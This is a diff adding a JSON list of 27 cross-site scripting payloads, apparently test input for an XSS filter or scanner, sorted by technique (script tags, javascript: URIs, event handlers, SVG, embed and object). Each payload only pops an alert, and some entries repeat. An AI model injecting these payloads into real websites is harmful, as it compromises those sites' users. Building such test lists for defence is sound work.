@@ -1,0 +1,110 @@
+{
+    "1": {
+        "type": "HTML Injection",
+        "payload": "<script>alert('XSS')</script>"
+    },
+    "2": {
+        "type": "JavaScript URI Injection",
+        "payload": "<img src=\"javascript:alert('XSS')\">"
+    },
+    "3": {
+        "type": "Inline Event Handler",
+        "payload": "<div onmouseover=\"alert('XSS')\"></div>"
+    },
+    "4": {
+        "type": "JavaScript URI Injection",
+        "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>"
+    },
+    "5": {
+        "type": "SVG Injection",
+        "payload": "<svg/onload=alert('XSS')>"
+    },
+    "6": {
+        "type": "JavaScript URI Injection",
+        "payload": "<a href=\"javascript:alert('XSS')\">Click me</a>"
+    },
+    "7": {
+        "type": "Inline Event Handler",
+        "payload": "<body onload=\"alert('XSS')\">"
+    },
+    "8": {
+        "type": "Inline Event Handler",
+        "payload": "<img src=\"x\" onerror=\"alert('XSS')\">"
+    },
+    "9": {
+        "type": "JavaScript URI Injection",
+        "payload": "<a href=\"javascript:eval('alert(1)')\">test</a>"
+    },
+    "10": {
+        "type": "JavaScript URI Injection",
+        "payload": "<form action=\"javascript:alert('XSS')\">"
+    },
+    "11": {
+        "type": "Inline Event Handler",
+        "payload": "<input type=\"text\" value=\"XSS\" onfocus=\"alert('XSS')\">"
+    },
+    "12": {
+        "type": "Embedded Script Injection",
+        "payload": "<embed src=\"data:text/html,<script>alert('XSS')</script>\">"
+    },
+    "13": {
+        "type": "Inline Event Handler",
+        "payload": "<video onerror=\"alert('XSS')\">"
+    },
+    "14": {
+        "type": "JavaScript URI Injection",
+        "payload": "<iframe src=\"javascript:alert('XSS')\">"
+    },
+    "15": {
+        "type": "JavaScript URI Injection",
+        "payload": "<base href=\"javascript:alert('XSS')\">"
+    },
+    "16": {
+        "type": "HTML Injection",
+        "payload": "<details open><summary>Click me</summary><p>text</p></details>"
+    },
+    "17": {
+        "type": "JavaScript Execution",
+        "payload": "<script>document.location='javascript:alert(1)' </script>"
+    },
+    "18": {
+        "type": "SVG Injection",
+        "payload": "<svg><script>alert('XSS')</script></svg>"
+    },
+    "19": {
+        "type": "SVG Injection",
+        "payload": "<svg/onload=confirm(\"XSS\")>"
+    },
+    "20": {
+        "type": "JavaScript URI Injection",
+        "payload": "<iframe src=\"javascript:alert('XSS')\">"
+    },
+    "21": {
+        "type": "Embedded Script Injection",
+        "payload": "<object data=\"data:text/html,<script>alert('XSS')</script>\"></object>"
+    },
+    "22": {
+        "type": "HTML Injection",
+        "payload": "\"><script>alert('XSS')</script>"
+    },
+    "23": {
+        "type": "HTML Injection",
+        "payload": "';alert('XSS');//"
+    },
+    "24": {
+        "type": "HTML Injection",
+        "payload": "\";alert('XSS');//"
+    },
+    "25": {
+        "type": "HTML Injection",
+        "payload": "</script><script>alert('XSS')</script>"
+    },
+    "26": {
+        "type": "Inline Event Handler",
+        "payload": "<img src=x onerror=alert('XSS')>"
+    },
+    "27": {
+        "type": "SVG Injection",
+        "payload": "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>"
+    }
+}
